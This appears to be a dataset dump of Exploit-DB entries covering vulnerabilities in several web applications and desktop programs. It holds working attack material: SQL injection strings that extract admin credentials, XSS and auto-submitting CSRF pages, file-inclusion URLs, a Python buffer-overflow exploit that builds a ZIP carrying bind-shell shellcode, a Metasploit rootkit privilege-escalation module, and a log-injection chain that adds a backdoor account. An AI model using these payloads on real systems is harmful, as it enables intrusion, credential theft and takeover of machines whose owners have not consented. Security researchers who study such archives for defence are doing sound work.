41531,"Network Community Script 3.0.2 - SQL Injection # # # # #  # Exploit Title: Network Community Script v3.0.2 - SQL Injection # Google Dork: N/A # Date: 06.03.2017 # Vendor Homepage: http://www.phpscriptsmall.com/ # Software : http://www.phpscriptsmall.com/product/network-community/ # Demo: http://socialcommunityscript.com/products/business_network/ # Version: 3.0.2 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/refer_job_view.php?jview=[SQL] # For example; # -1'+/*!50000union*/+select+1,2,3,4,5,6,@@version,8,9,10,11,12,13,14,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),16,17,18,19,20,0x496873616e2053656e63616e203c62723e7777772e696873616e2e6e6574,22,23--+- # admin :admin_id # admin :admin_name # admin :username # admin :adminpassword # admin :email # -1'+/*!50000union*/+select+1,2,3,4,5,6,/*!50000ConCat(*/username,/*!50000char*/(58),adminpassword),8,9,10,11,12,13,14,15,16,17,18,19,20,0x496873616e2053656e63616e203c62723e7777772e696873616e2e6e6574,22,23+/*!50000from*/+admin--+- # Etc... # # # # #",remote,webapps,1
32130,"DEV Web Management System 1.5 - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/30447/info  DEV Web Management System is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data. The issues include local file-include, SQL-injection, and cross-site scripting vulnerabilities.  Exploiting these issues could allow an attacker to view sensitive information, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  DEV Web Management System 1.5 is vulnerable; other versions may also be affected.   http://www.example.com/?session="">><>><script>alert(document.cookie)</script> <html> <head></head> <body onLoad=javascript:document.form.submit()> <form action=""http://www.example.com/index.php?session=0&action=search"" method=""POST"" name=""form""> <form method=""post"" onSubmit=""return validateprm(this)""><input type=""hidden"" name=""prip"" value=""true""/><input type=""hidden"" name=""action"" value=""search""/> <input type=""hidden"" name=""kluc"" value=""&#34&#39&#39&#39&#60&#62&#62&#62&#62<script>alert('xss')</script>""> </form> </body> </html> http://www.example.com/index.php?session=0&action=read&click=open&article=[SQL CODE] http://www.example.com/admin/index.php?start=install&step=file.type%00",local,webapps,0
6451,"Talkback 2.3.6 - Multiple Local File Inclusion / PHPInfo Disclosure Vulnerabilities ############################################################################################################ [+] Talkback 2.3.6 Multiple Local File Inclusion/PHPInfo Disclosure [+] Discovered By SirGod  [+] MorTal TeaM                      [+] Greetz : E.M.I.N.E.M,Ras,Puscas_marin,ToxicBlood,HrN,kemrayz,007m,Raven,Nytr0gen,str0ke                      ############################################################################################################   [+] Local File Inclusion      PoC 1 :       http://[target]/[path]/comments.php?language=[Local File]%00     Example 1 :         http://127.0.0.1/talkback/comments.php?language=../../../../autoexec.bat%00      PoC 2 :       http://[target]/[path]/install/help.php?language=[Local File]%00     Example 2 :       http://127.0.0.1/talkback/install/help.php?language=../../../../../autoexec.bat%00     [+] PHPInfo Disclosure      PoC:       http://[target]/[path]/install/info.php     Example :       http://127.0.0.1/talkback/install/info.php   ##############################################################################################################  # milw0rm.com [2008-09-13]",local,webapps,1
12641,"JE CMS 1.1 - SQL Injection ==========================================================================================================================================================     [o] JE CMS SQL Injection Vulnerability          Software : JE CMS version 1.1        Vendor   : http://joenasejes.cz.cc/        Author   : AntiSecurity [ NoGe Vrs-hCk OoN_BoY Paman zxvf s4va ]        Contact  : public[dot]antisecurity[dot]org        Home     : http://antisecurity.org/   ==========================================================================================================================================================     [o] Exploit         http://localhost/[path]/index.php?jepage=viewcategory&categoryid=[sql]     [o] PoC         http://localhost/index.php?jepage=viewcategory&categoryid=84+and+1=2+union+all+select+1,group_concat(username,0x3a,password),3,4,5,6+from+users--   ==========================================================================================================================================================     [o] Greetz         Angela Zhang stardustmemory aJe martfella pizzyroot Genex        H312Y yooogy mousekill }^-^{ noname matthews s4va wishnusakti        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke        ArRay bjork xmazinha & all people in #evilc0de [at] irc.byroe.net   ==========================================================================================================================================================     [o] May 17 2010 - GMT +07:00 Jakarta, Indonesia",remote,webapps,1
11872,"KenWard's Zipper 1.400 - Local Buffer Overflow (2) #!/usr/bin/python  ## KenWard's Zipper v1.400 File Name Buffer Overflow ## Coded by sinn3r  (x90.sinner{at}gmail{d0t}com) ## Tested on: Windows XP SP3 ENG ## Reference: http://www.exploit-db.com/exploits/11834 ## Big thanks to mr_me, and corelanc0d3r. ## greetz to all the friends at Corelan Scurity Team & Exploit-DB... coolest people ever! ## ## Description: ## This exploit takes advantage of the fact too many characters get mangled, as a result ## I was able to get a shell in a more straight forward way.  Very interesting exercise. ## Mr_me and tecR0c figured out this trick, of course.  But I was given the honor to share it.  ## Script provided 'as is', without any warranty. ## Use for educational purposes only.  Do not use this code to do anything illegal.  ## Zip file format based on: ## http://en.wikipedia.org/wiki/ZIP_(file_format) local_file_header = ( ""\x50\x4B\x03\x04"" 	#Local file header signature ""\x00\x02""		#Version needed to extract ""\x00\x08""		#General purpose bit flag ""\x00\xDA""		#Compression method ""\xA2\x48""		#File last modification time ""\x3B\xF6""		#File last modification date ""\x66\x18\x0D\x4E""	#CRC-32 ""\xEF\x0F\x00\x00""	#Compressed size (payload size) ""\x14\x00\x00\x00""	#Uncompressed size ""\xe4\x4f""		#File name length ""\x04\x00""		#Extra field length #""\x73\x65\x63\x72\x65\x74\x73""	#File name (n) ASCII ""secrets"" #""\x42\x42\x42\x42""	#Extra field (m) );  central_directory_file_header = ( ""\x50\x4b\x01\x02""	#Central directory file header signature ""\x14\x00""		#Version made by ""\x14\x00""		#Version needed to extract ""\x00\x08""		#General purpose bit flag ""\x00\xDA""		#Compression method ""\xA2\x48""		#File last modification time ""\x3B\xF6""		#File last modification date ""\x66\x18\x0D\x4E""	#CRC-32 ""\xE4\x0F\x00\x00""	#Compressed size (payload size) ""\x14\x00\x00\x00""	#Uncompressed size ""\xe4\x0f""		#File name length (n) ""\x04\x00""		#Extra field length (m) ""\x04\x00""		#File comment length ""\x00\x01""		#Disk number where file starts ""\x00\x00""		#Internal file attributes ""\x20\x00\x00\x00""	#External file attributes ""\x00\x00\x00\x00""	#Relative offset of local file header #""\x73\x65\x63\x72\x65\x74\x73""	#File name (n) ASCII ""secrets"" #""\x42\x42\x42\x42""	#Extra field (m) #""\x43\x43\x43\x43""	#File comment (k) );  end_of_central_directory_record = ( ""\x50\x4B\x05\x06""	#End of central directory signature ""\x00\x00""		#Number of this disk ""\x00\x00""		#Disk where central directory starts ""\x01\x00""		#Number of central directory records on this disk ""\x01\x00""		#Total number of central directory records ""\x12\x10\x00\x00""	#Size of central directory (central directory size + payload) ""\x02\x10\x00\x00""	#Offset of start of central directory, relative to start of archive (lfh + payload) ""\x00\x00""		#Zip file comment length (n) );   ## Align EAX for the base address of the alpha2 encoded bindshell alignEAX = ( ""\x05\x10\x7E\x10\x7E""	#ADD EAX, 0x7E107E10 ""\x05\x09\x75\x01\x7E""	#ADD EAX, 0x7E017509 ""\x05\x02\x03\x01\x04""	#ADD EAX, 0x04010302 ""\x72\x07""+		#JB jump over the bytes we can't overwrite ""\x41""*12		#NOPs );  ## windows/shell_bind_tcp lport=4444 exitfunc=seh ## alpha2 eax --uppercase   744 bytes shellcode = (""PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLZHMYEP5PS03PK"" ""9ZE6QN2CTLK0RVPLKPR4LLKQBTTLKSBVH4ONWQZVFFQKOFQO0NLGL3QSL4BVLQ0YQXO4MUQIWKRJPF2QGLKPRB0"" ""LKPBGLEQ8PLK70RXMUO0BTQZEQHPPPLK78TXLK687PS1XSM37LPILKWDLKUQ8V6QKO6QYPNL9Q8OTMEQ9WFXKPT"" ""5ZT33SMJX7KCM14CEZB1HLKPXWTUQN3SVLKTLPKLKV85LEQXSLK34LKS1HPK9W47TQ4QK1KSQQI0Z0QKOM0PXQO"" ""QJLKTRJKK61MSXVS02EP5PCXBW3CFRQOF4SXPLT77VDGKO9EX8LPS1UPS0WYO4F4PP3X7YMP2KS0KOHUV00P0P6"" ""0QPV01PPPRHJJTOIOKPKON5MYO7FQYK0SSXS2S0TQQLMYKVSZB0PVPW3XO2YK7GCWKO8UPSPWE8X7KYWHKOKOHU"" ""QCV3PWSX2TJLGKKQKON5V7MYHG58BU2N0M3QKON52HRCBM54UPMYKS0W67676QL62JTRPYPVKRKMSVO774WTWLU"" ""QUQLM0DGTB0O65PPD0TV0PV0V0VQVPVPNPV1FQC66SXT9XLWOLFKOYEK9M0PNV6QVKOFPCXUXK75MSPKON5OKKN"" ""TNP2ZJBHY6LUOMMMKON5WLUV3L5ZK0KKKPRUC5OKW74S2R2ORJ5PPSKO8UUZA"")  ## 4064+4 bytes ## Pointer to next SEH record: 1022 bytes ## SE handler                : 1026 bytes payload = ( ""\x41""*(1017-len(alignEAX)-len(shellcode))+	#Padding alignEAX+					#Align EAX for the bindshell shellcode+					#Bindshell lport 4444 ""\x82\x85\x81\x98\x98""				#This will get mangled and become ""\xE9\xE0\xFC\xFF\xFF"" ""\x73\x97\x42\x42""				#JNB 0x97 = JNB 0xF9 = Same as EB 0xFB = Rewind 5 bytes ""\x7E\x27\x41\x00""+				#POP POP RET = 0x0041277E ""\x44""*3034+					#Padding "".bin""						#Fake name );  ## Create the ZIP structure with our payload zip = ( local_file_header + payload + central_directory_file_header + payload + end_of_central_directory_record );  f = open(""sploit.zip"", ""w"") f.write(zip) f.close()  print ""[*] Local file header size = 0x%x"" %len(local_file_header) print ""[*] Central directory file header size = 0x%x"" %len(central_directory_file_header) print ""[*] End of central directory record size = 0x%x"" %len(end_of_central_directory_record) print ""[*] Payload size = %s bytes"" %len(payload) print ""[*] sploit.zip created.  Open it with KenWard's Zipper.""",local,local,1
26270,"Content2Web 1.0.1 - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/14862/info  Content2Web is affected by multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this lack of sanitization to perform SQL injection attacks, cross-site scripting attacks and include local PHP files. It may also be possible to include remote PHP files as well; this has not been confirmed.  The consequences of these attacks vary from a compromise of the system, the execution of arbitrary code and the theft of cookie-based authentication credentials, all in the context of the Web server process.  SQL Injection ------------- http://www.example.com/index.php?show=c2w_news%2Ephp&cat=news_archiv  XSS --- http://www.example.com/index.php?show=%3C/textarea%3E%3Cscript%3Ealert(%27XSS aka %27);%3C/script%3E&site=impressum  File Inclusion -------------- http://www.example.com/index.php?show=[file]&cat=news_archiv&start=1",remote,webapps,1
6843,"SFS Ez Forum - SQL Injection ==================================================================================       SFS Forum (forum.php id) Remote SQL Injection Vulnerability ================================================================================== 			   __  __           __           			   / / / /_  _______/ /__  __  __ 			  / /_/ / / / / ___/ / _ \/ / / / 			 / __  / /_/ / /  / /  __/ /_/ /  			/_/ /_/\__,_/_/  /_/\___/\__, /   			                        /____/    ================================================================================== ---------------------------------------------------------------------------------- Website script: http://www.scripts-for-sites.info/index.php ---------------------------------------------------------------------------------- Exploit:      http://localHost/forum/forum.php?forum=-9999+union+all+select+null,concat_ws(0x3a,password,username,%20email),null,null+from+users/* ---------------------------------------------------------------------------------- LiveDemo: http://www.turnkeyzone.com/demos/forum/forum.php?forum=-9999+union+all+select+null,concat_ws(0x3a,password,username,%20email),null,null+from+users/* ----------------------------------------------------------------------------------  ================================================================================== Greetz      : Boom3rang Special Thx : Darckc0de ==================================================================================  # milw0rm.com [2008-10-26]",remote,webapps,1
7086,"AJSquare Free Polling Script - 'DB' Multiple Vulnerabilities ==============================================================================                       _      _       _          _      _   _                       / \    | |     | |        / \    | | | |                     / _ \   | |     | |       / _ \   | |_| |                    / ___ \  | |___  | |___   / ___ \  |  _  |    IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|                                                                ==============================================================================                       ____   _  _     _   _    ___    _  __                      / ___| | || |   | \ | |  / _ \  | |/ /                     | |  _  | || |_  |  \| | | | | | | ' /                      | |_| | |__   _| | |\  | | |_| | | . \                       \____|    |_|   |_| \_|  \___/  |_|\_\  ============================================================================== 	AJSquare Free Polling Script (DB) Multiple Vulnerabilities ==============================================================================  	[Â»] Script:             [ AJSquare Free Polling Script DataBase Version ] 	[Â»] Language:           [ PHP ] 	[Â»] Website:            [ http://www.ajsquare.com/resources/dpoll.php?resource=free_script ] 	[Â»] Type:               [ Free ] 	[Â»] Report-Date:        [ 10.11.2008 ] 	[Â»] Founder:            [ G4N0K <mail.ganok[at]gmail.com> ]   ===[ XPL ]===  	[1][!] Blind SQLi (MQ = off) 		[Â»] http://127.0.0.1/[path]/admin/include/newpoll.php?ques=1%27/**/AND/**/substring(@@version,1,1)=5/*		True 		[Â»] http://127.0.0.1/[path]/admin/include/newpoll.php?ques=1%27/**/AND/**/substring(@@version,1,1)=4/*		False 		 		[../admin/include/newpoll.php] 		 			<?php 			require 'connect.php'; 			$ques = $_GET[ques]; 			$total = $_GET[total]; 			for($i=1;$i<=$total;$i++) 				{ 					$val[] = array($_GET[""val"".$i]); 				}  			$sqlnew = ""select * from newpoll where question='$ques'""; 			$resnew = mysql_query($sqlnew); 			 		[../admin/include/newpoll.php] 	 	 	  	[2][!] Reset Votes - Just call resetvote.php ;) 		[Â»] http://127.0.0.1/[path]/admin/resetvote.php   	 	 ===[ Greetz ]===  	[Â»] ALLAH 	[Â»] Tornado2800 <Tornado2800[at]gmail.com> 	[Â»] Hussain-X <darkangel_g85[at]yahoo.com>  	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-) 	//ALLAH,forgimme...  =============================================================================== exit(); ===============================================================================  # milw0rm.com [2008-11-10]",remote,webapps,1
44169,"Armadito Antivirus 0.12.7.2 - Detection Bypass /* Title: Armadito Antivirus - Malware Detection Bypass  Date: 21/02/2018 Author: Souhail Hammou Author's website: http://rce4fun.blogspot.com Vendor Homepage: http://www.teclib-edition.com/en/ Version: 0.12.7.2 CVE: CVE-2018-7289   Details: -------- An issue was discovered in armadito-windows-driver/src/communication.c affecting Armadito 0.12.7.2 and previous versions. Malware with filenames containing pure UTF-16 characters can bypass detection.  The user-mode service will fail to open the file for scanning after the conversion is done from Unicode to ANSI.  This happens because characters that cannot be converted from Unicode are replaced with the '?' character.  The code responsible for this issue is located in armadito-windows-driver/src/communication.c  ======================================================================================================== 		 // Convert unicode string to ansi string for ring 3 process.		  		 ntStatus = RtlUnicodeStringToAnsiString(&AnsiString, (PCUNICODE_STRING)FilePath, TRUE);  		 if(!NT_SUCCESS(ntStatus)){  			DbgPrint(""[-] Error :: ArmaditoGuard!SendScanOrder :: RtlUnicodeStringToAnsiString() routine failed !! \n"");  			__leave;  		 }  ========================================================================================================  The two examples below demonstrate the bug.  In the first case, the filename is in Arabic and in the second, the filename's first letter is the greek M (U+039C).   Original filename:  مرحبا.exe : 0645 0631 062d 0628 0627 002e 0065 0078 0065   Converted to ANSI by Armadito:  ?????.exe : 3f 3f 3f 3f 3f 2e 65 78 65   =============================  Original filename:  Μalware.exe : 039c 0061 006c 0077 0061 0072 0065 002e 0065 0078 0065   Converted to ANSI by Armadito:  ?alware.exe : 3f 61 6c 77 61 72 65 2e 65 78 65    See: https://github.com/armadito/armadito-windows-driver/issues/5 */",local,local,1
23025,SurgeLDAP 1.0 d - 'User.cgi' Cross-Site Scripting source: https://www.securityfocus.com/bid/8407/info  SurgeLDAP is prone to cross-site scripting attacks. Remote attackers may exploit this issue by enticing a user to visiting a malicious link that includes hostile HTML and script code. This code may be rendered in the user's browser when the link is visited.  This issue exists in the web server component of SurgeLDAP.  http://www.example.com:6680/user.cgi?cmd=<script>alert('C.S.S')</script>&utoken=,remote,webapps,1
30523,Skulltag Huffman 0.97d-beta4.1 - Packet Decompression Remote Heap Buffer Overflow source: https://www.securityfocus.com/bid/25423/info  Skulltag is prone to a remote heap-based buffer-overflow vulnerability because it fails to perform adequate boundary-checks on user-supplied input.  Attackers can exploit this issue to execute arbitrary code with the privileges of the user running the application. Successful exploits may compromise affected computers. Failed attacks will likely cause denial-of-service conditions.  Skulltag 0.97d-beta4.1 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/30523.zip,remote,remote,1
48227,"NetBackup 7.0 - 'NetBackup INET Daemon' Unquoted Service Path # Exploit Title: NetBackup 7.0 - 'NetBackup INET Daemon' Unquoted Service Path # Discovery by: Alan Mondragon ""El Masas"" # Discovery Date: 2020-03-17 # Vendor Homepage: https://www.veritas.com/ # Software Link : https://www.veritas.com/ # Veritas # Tested Version: 7.0 # Vulnerability Type: Unquoted t Service Path # Tested on OS: Windows Server 2008 R2 en  # Step to discover Unquoted Service Path:    C:\>wmic service get name, displayname, pathname, startmode | findstr /i ""Auto"" | findstr /i /v ""C:\Windows\\"" | findstr /i /v """"""                                                                                                                                                                                                   Auto NetBackup Client Service NetBackup INET Daemon                       C:\Program Files\Veritas\NetBackup\bin\bpinetd.exe                                                     Auto C:\>sc qc ""NetBackup INET Daemon"" [SC] QueryServiceConfig SUCCESS         SERVICE_NAME: NetBackup INET Daemon                                                                                                                                                                             TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files\Veritas\NetBackup\bin\bpinetd.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : NetBackup Client Service         DEPENDENCIES       :          SERVICE_START_NAME : LocalSystem  #Exploit: # A successful attempt would require the local user to be able to insert their code in the system root path  # undetected by the OS or other security applications where it could potentially be executed during  # application startup or reboot. If successful, the local user's code would execute with the elevated  # privileges of the application.",local,local,1
47804,"Reptile Rootkit - reptile_cmd Privilege Escalation (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Local   Rank = ExcellentRanking    include Msf::Post::File   include Msf::Post::Linux::Priv   include Msf::Post::Linux::System   include Msf::Exploit::EXE   include Msf::Exploit::FileDropper    def initialize(info = {})     super(update_info(info,       'Name'           => 'Reptile Rootkit reptile_cmd Privilege Escalation',       'Description'    => %q{         This module uses Reptile rootkit's `reptile_cmd` backdoor executable         to gain root privileges using the `root` command.          This module has been tested successfully with Reptile from `master`         branch (2019-03-04) on Ubuntu 18.04.3 (x64) and Linux Mint 19 (x64).       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'f0rb1dd3n', # Reptile           'bcoles'     # Metasploit         ],       'DisclosureDate' => '2018-10-29', # Reptile first stable release       'References'     =>         [           ['URL', 'https://github.com/f0rb1dd3n/Reptile'],           ['URL', 'https://github.com/f0rb1dd3n/Reptile/wiki/Usage']         ],       'Platform'       => ['linux'],       'Arch'           => [ARCH_X86, ARCH_X64],       'SessionTypes'   => ['shell', 'meterpreter'],       'Targets'        => [['Auto', {}]],       'Notes'          =>         {           'Reliability' => [ REPEATABLE_SESSION ],           'Stability'   => [ CRASH_SAFE ]         },       'DefaultTarget'  => 0))     register_options [       OptString.new('REPTILE_CMD_PATH', [true, 'Path to reptile_cmd executable', '/reptile/reptile_cmd'])     ]     register_advanced_options [       OptBool.new('ForceExploit', [false, 'Override check result', false]),       OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])     ]   end    def reptile_cmd_path     datastore['REPTILE_CMD_PATH']   end    def base_dir     datastore['WritableDir'].to_s   end    def upload(path, data)     print_status ""Writing '#{path}' (#{data.size} bytes) ...""     rm_f path     write_file path, data     register_file_for_cleanup path   end    def upload_and_chmodx(path, data)     upload path, data     chmod path   end    def check     unless executable? reptile_cmd_path       vprint_error ""#{reptile_cmd_path} is not executable""       return CheckCode::Safe     end     vprint_good ""#{reptile_cmd_path} is executable""      res = cmd_exec(""echo id|#{reptile_cmd_path} root"").to_s.strip     vprint_status ""Output: #{res}""      if res.include?('You have no power here!')       vprint_error 'Reptile kernel module is not loaded'       return CheckCode::Safe     end      unless res.include?('root')       vprint_error 'Reptile is not installed'       return CheckCode::Safe     end     vprint_good 'Reptile is installed and loaded'      CheckCode::Vulnerable   end    def exploit     unless check == CheckCode::Vulnerable       unless datastore['ForceExploit']         fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'       end       print_warning 'Target does not appear to be vulnerable'     end      if is_root?       unless datastore['ForceExploit']         fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'       end     end      unless writable? base_dir       fail_with Failure::BadConfig, ""#{base_dir} is not writable""     end      payload_name = "".#{rand_text_alphanumeric 8..12}""     payload_path = ""#{base_dir}/#{payload_name}""     upload_and_chmodx payload_path, generate_payload_exe      print_status 'Executing payload...'     res = cmd_exec ""echo '#{payload_path}&' | #{reptile_cmd_path} root & echo ""     vprint_line res   end end",local,local,1
42614,"Mongoose Web Server 6.5 - Cross-Site Request Forgery / Remote Code Execution [+] Credits: John Page AKA hyp3rlinx	 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/MONGOOSE-WEB-SERVER-v6.5-CSRF-COMMAND-EXECUTION.txt [+] ISR: apparitionSec                 Vendor: =============== www.cesanta.com    Product: ================== Mongoose Web Server (Free Edition) Mongoose-free-6.5.exe Download: https://cesanta.com/binary.html   Mongoose - GitHub's most popular embedded web server and multi-protocol networking library  Mongoose Embedded Web Server Library - Mongoose is more than an embedded webserver. It is a multi-protocol embedded networking library with functions including TCP, HTTP client and server, WebSocket client and server, MQTT client and broker and much more.    Vulnerability Type: =================== CSRF - Command Execution    CVE Reference: ============== CVE-2017-11567    Security Issue: ================ Remote attackers who can lure a Mongoose web server user into clicking a malicious link or visit attacker controlled web page can execute system commands on the system hosting Mongoose server. However, IF Mongoose web server is installed as service then executing programs e.g. ""calc.exe"" may at times crash or fail to appear, but you may see it in Windows taskmgr.exe. Therefore, from my tests commands may become unstable when Mongoose is run as a service.  When Mongoose is run standard mode attackers can potentially modify ""Mongoose.conf"" and create arbitrary files on server like .PHP etc. to point Mongoose to this as its new ""index"" file. Then you need to tell Mongoose its ""access_log_file"" is the new attacker generated file, after injecting commands into Mongoose web servers log file that will get excuted when log file is later requested.  This vulnerability requires CGI interpreter to be already set or some information about the target is known like the CGI path and language ""pl,php,cgi"" used, so when we can set to use correct programming language when file is created during initial CRSF attack.  Note: If running commands with arguments, we have to use ""\t"" tab chars as using space will break our TELNET based code injection to the server log.  e.g.  GET<?php exec(""cmd.exe\t/c\tnet\tuser\tHACKER\tabc123\t/add"");?> HTTP/1.1  OR just TELNET to Mongoose web server, inject arbitrary commands, then call exec by making another TELNET HTTP GET.   After Command Injection ""Mongoose.conf"" will be:  # Mongoose web server configuration file. # For detailed description of every option, visit # https://github.com/cesanta/Mongoose # Lines starting with '#' and empty lines are ignored. # To make a change, remove leading '#', modify option's value, # save this file and then restart Mongoose.  # access_control_list  access_log_file C:\Mongoose.access.php     <======= BOOM # auth_domain mydomain.com cgi_interpreter c:\xampp\php\php.exe     <====== MUST BE SET # cgi_pattern **.cgi$|**.pl$|**.php$ # dav_auth_file  # dav_root  # debug 0 document_root C:\ # enable_directory_listing yes # error_log_file  # extra_headers  # extra_mime_types  # global_auth_file  # hide_files_patterns  # hexdump_file  index_files Mongoose.access.php   <======== BOOM # listening_port 8080 # run_as_user  # ssi_pattern **.shtml$|**.shtm$ # ssl_certificate  # ssl_ca_certificate  # start_browser yes # url_rewrites    Mongoose log file Command Inject to create backdoor. -----------------------------------------------------------  2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 - 2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 - 2017-07-24 03:12:30 - 127.0.0.1 - GET<?php exec(""cmd.exe\t/c\tnet\tuser\tHACKER\tabc123\t/add"");?> 400 0 - 2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin 200 5234 - 2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin?get_settings 200 4294967295 http://127.0.0.1:8080/__mg_admin 2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /__mg_admin?get_cfg_file_status 200 4294967295 http://127.0.0.1:8080/__mg_admin 2017-07-24 03:12:40 - 127.0.0.1 127.0.0.1:8080 GET /favicon.ico 404 0 -    Tested Windows 7.    Exploit/POC: =============  1) add backdoor account POC.  <form action=""http://127.0.0.1:8080/__mg_admin?save"" method=""post""> <input type=""hidden"" name=""access_log_file"" value=""Mongoose.access.php""> <input type=""hidden"" name=""cgi_pattern"" value=""**.cgi$|**.pl$|**.php""> <input type=""hidden"" name=""index_files"" value=""Mongoose.access.php""> <input type=""hidden"" name=""cgi_interpreter"" value=""c:\xampp\php\php.exe""> <script>document.forms[0].submit()</script> </form>   2) TELNET x.x.x.x 8080 GET<?php exec(""cmd.exe\t/c\tnet\tuser\tHACKER\tabc123\t/add"");?> HTTP/1.1  Enter  Enter  TELNET x.x.x.x 8080 GET / HTTP/1.1  Enter  Enter  Done, backdoor added!   ====================  1) run calc.exe POC.  <form action=""http://127.0.0.1:8080/__mg_admin?save"" method=""post""> <input type=""hidden"" name=""cgi_pattern"" value=""**.cgi$|**.pl$|**.exe""> <input type=""hidden"" name=""index_files"" value=""../../../../../../Windows/system32/calc.exe""> <input type=""hidden"" name=""cgi_interpreter"" value=""../../../../../../Windows/system32/calc.exe""> <script>document.forms[0].submit()</script> </form>  2) TELNET x.x.x.x 8080 GET / HTTP/1.1  Enter  Enter    Network Access: =============== Remote    Severity: ========= Medium    Disclosure Timeline: ================================= Vendor Notification: July 23, 2017 Vendor Notification: July 28, 2017 Vendor Acknowledgement: July 31, 2017 Vendor Fixed released version  6.9 : September 4, 2017 September 4, 2017 : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).  hyp3rlinx",remote,remote,1
27230,"My Blog 1.63 - BBCode HTML Injection source: https://www.securityfocus.com/bid/16659/info  My Blog is prone to an HTML-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.   Attacker-supplied HTML and script code would be executed in the context of the affected site, potentially allowing for the theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.  Examples have been provided:  [img]javascript:alert(123)[/img]  [url=javascript:alert(123)]Click me[/url]",remote,webapps,1
39949,"Ultrabenosaurus ChatBoard - Cross-Site Request Forgery (Send Message) <!--  # Exploit Title: Ultrabenosaurus ChatBoard - CSRF(Send Message) # Date: 2016-06-14 # Exploit Author: HaHwul # Exploit Author Blog: www.hahwul.com # Vendor Homepage: http://ultrabenosaurus.ninja/ # Software Link: https://github.com/Ultrabenosaurus/ChatBoard/archive/master.zip # Tested on: Debian [wheezy]  ### Vulnerability Code ----------------------------------------------------------------------------------------- POST /vul_test/ChatBoard/__original/chat.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: http://CSRF_NO_REFERE_CHECK Content-Length: 8 Cookie: PHPSESSID=3oecem8o5c8975dcufbb0moqn5 Connection: keep-alive  msg=CSRF ### Response ----------------------------------------------------------------------------------------- HTTP/1.1 200 OK Date: Tue, 14 Jun 2016 01:52:02 GMT Server: Apache/2.4.10 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 7 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8  written -----------------------------------------------------------------------------------------  ### Vulnerability Code -->  <form name=""csrf_poc"" action=""http://127.0.0.1/vul_test/ChatBoard/__original/chat.php"" method=""POST""> <input type=""hidden"" name=""msg"" value=""CSRF""> <input type=""submit"" value=""CSRF Attack""> </form> <script type=""text/javascript"">document.forms.csrf_poc.submit();</script>",remote,webapps,1
21509,"Teekai Tracking Online 1.0 - Cross-Site Scripting source: https://www.securityfocus.com/bid/4924/info  Teekai's Tracking Online does not adequately filter HTML tags from certain URL parameters, making it prone to cross-site scripting attacks. Attackers may exploit this by creating a malicious link to a vulnerable webpage.  http://target/page.php?action=view&id=1<script>alert(document.cookie)</script >",remote,webapps,1
11375,"Zomorrod CMS - SQL Injection ################################################################# # Securitylab.ir ################################################################# # Application Info: # Name: Zomorrod Cms # Vendor: http://www.zomorrod.net ################################################################# Vulnerability: http://site.ir/topic.php?SITE_item=54'+and+convert(int,@@version)='54 ################################################################# # Discoverd By: Pouya Daneshmand # Website: http://securitylab.ir # Contacts: info[at]securitylab.ir & whh_iran@yahoo.com<mailto:whh_iran@yahoo.com> ###################################################################",remote,webapps,1
